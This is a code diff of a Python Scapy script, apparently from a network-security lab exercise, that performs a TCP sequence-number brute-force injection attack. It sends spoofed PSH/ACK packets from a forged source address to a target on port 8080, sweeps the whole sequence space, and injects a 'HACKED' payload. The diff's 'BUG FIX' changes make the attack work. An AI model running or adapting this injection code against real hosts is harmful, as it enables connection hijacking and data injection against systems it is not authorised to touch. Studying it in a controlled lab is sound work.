@@ -1,48 +1,67 @@
 from scapy.all import IP, TCP, send
+import sys
 import time
 
-# -----------------------------
-# Configuration
-# -----------------------------
-TARGET_IP = "20.0.0.20"
-SPOOFED_IP = "10.0.0.10"
-
-SPORT = 33776          # Update to the current client source port
-DPORT = 8080
-
-# Sequence number search range
-START = 2523698400
-END = 2523699500
-STEP = 10
-
+TARGET = "20.0.0.20"
+SPOOFED = "10.0.0.10"
 
 def main():
 
-    print("=" * 60)
-    print("TCP Sequence Number Guessing Attack")
-    print("=" * 60)
+    if len(sys.argv) < 3:
+        print("=" * 60)
+        print("TCP Sequence Guess Attack (Brute Force)")
+        print("=" * 60)
+        print()
+        print(f"Usage: sudo python3 {sys.argv[0]} <client_port> <server_seq>")
+        print()
+        print("  client_port = Client's source port (from firewall table)")
+        print("  server_seq  = Server's SEQ number (from firewall table)")
+        print()
+        print("Example:")
+        print(f"  sudo python3 {sys.argv[0]} 50210 2523698453")
+        sys.exit(1)
 
-    for seq in range(START, END, STEP):
+    sport = int(sys.argv[1])
+    server_seq = int(sys.argv[2])
 
-        print(f"Trying SEQ : {seq}")
+    print("=" * 60)
+    print("TCP Sequence Guess Attack (Brute Force)")
+    print("=" * 60)
+    print()
+    print(f"Target     : {TARGET}:8080")
+    print(f"Spoofed    : {SPOOFED}")
+    print(f"Port       : {sport}")
+    print(f"Server SEQ : {server_seq} (used as ACK)")
+    print()
+
+    # BUG FIX: Step was 100000000 (too large, skips valid window)
+    # TCP window is ~65535, so step must be <= 65535
+    STEP = 65535
+
+    for seq in range(0, 2**32, STEP):
+
+        print(f"[+] Guessing SEQ : {seq}")
 
         pkt = (
-            IP(src=SPOOFED_IP, dst=TARGET_IP)
+            IP(src=SPOOFED, dst=TARGET)
             /
             TCP(
-                sport=SPORT,
-                dport=DPORT,
+                sport=sport,
+                dport=8080,
                 flags="PA",
                 seq=seq,
-                ack=1
+                ack=server_seq       # BUG FIX: was ack=1
             )
+            / b"HACKED\n"
         )
 
         send(pkt, verbose=False)
 
-        time.sleep(0.5)
+        time.sleep(0.01)
 
-    print("\nAttack Finished")
+    print("=" * 60)
+    print("Attack Finished")
+    print("=" * 60)
 
 
 if __name__ == "__main__":
